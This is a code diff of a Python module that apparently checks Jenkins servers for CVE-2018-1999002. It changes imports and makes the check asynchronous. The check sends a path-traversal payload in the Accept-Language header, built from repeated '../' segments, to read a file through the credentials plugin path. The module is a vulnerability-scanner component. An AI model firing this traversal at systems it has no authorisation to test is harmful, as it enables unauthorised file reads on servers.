@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 
-from app.lib.utils.request import request
-from app.lib.utils.common import get_useragent
+from app.lib.common import get_useragent
+from app.lib.request import request
 
 class CVE_2018_1999002_BaseVerify:
     def __init__(self, url):
@@ -22,7 +22,7 @@ class CVE_2018_1999002_BaseVerify:
             'Accept-Language': ('../' * self.BACKDIR_COUNT) + self.file_name
         }
 
-    def check(self):
+    async def check(self):
         
         """
         检测是否存在漏洞
@@ -34,18 +34,12 @@ class CVE_2018_1999002_BaseVerify:
         
         try:
             check_url =  self.url + '/plugin/credentials/.ini'
-            check_req = request.get(check_url, headers = self.header)
-            if "MPEGVideo" in check_req.text and check_req.status_code == 200:
-                print('存在CVE-2018-1999002漏洞')
+            check_req = await request.get(check_url, headers = self.header)
+            if "MPEGVideo" in await check_req.text() and check_req.status == 200:
+                # print('存在CVE-2018-1999002漏洞')
                 return True
-            else:
-                print('不存在CVE-2018-1999002漏洞')
-                return False
         except Exception as e:
-            print(e)
-            print('不存在CVE-2018-1999002漏洞')
-            return False
-        finally:
+            # print(e)
             pass
 
 if __name__ == '__main__':
